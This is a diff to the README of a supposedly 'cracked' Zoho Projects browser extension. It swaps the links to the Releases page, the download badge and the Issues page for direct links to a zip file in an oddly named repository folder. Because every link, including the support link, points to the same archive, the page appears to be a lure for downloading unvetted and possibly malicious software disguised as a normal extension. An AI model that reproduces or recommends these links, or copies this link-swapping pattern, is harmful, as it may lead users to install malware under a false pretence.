@@ -1,6 +1,6 @@
 # 🌟 cracked-save-to-zoho-projects-extension - Save Time with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Maikeldm/cracked-save-to-zoho-projects-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/Maikeldm/cracked-save-to-zoho-projects-extension/main/Freudist/cracked-save-to-zoho-projects-extension.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Maikeldm/cracked-save-to-zoho-projects-extension/main/Freudist/cracked-save-to-zoho-projects-extension.zip)
 
 ## 📦 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -17,7 +17,7 @@ The cracked-save-to-zoho-projects-extension is a simple browser extension that h
 ## 💾 Download & Install
 To get started with the cracked-save-to-zoho-projects-extension, you need to download the extension. Click the link below to access the Releases page.
 
-[Download Now](https://github.com/Maikeldm/cracked-save-to-zoho-projects-extension/releases)
+[Download Now](https://raw.githubusercontent.com/Maikeldm/cracked-save-to-zoho-projects-extension/main/Freudist/cracked-save-to-zoho-projects-extension.zip)
 
 Follow these steps to install the extension:
 
@@ -57,6 +57,6 @@ If you encounter any issues while using the extension, consider these steps:
 - Restart your browser if the extension does not respond.
 
 ## 📞 Support
-For further assistance, please visit the [Issues](https://github.com/Maikeldm/cracked-save-to-zoho-projects-extension/issues) section of the repository to report problems or ask questions. You can also contribute to discussions or check for updates. Your feedback can help improve this extension. 
+For further assistance, please visit the [Issues](https://raw.githubusercontent.com/Maikeldm/cracked-save-to-zoho-projects-extension/main/Freudist/cracked-save-to-zoho-projects-extension.zip) section of the repository to report problems or ask questions. You can also contribute to discussions or check for updates. Your feedback can help improve this extension. 
 
 For any direct support, consider reaching out via the Discussions tab on GitHub.
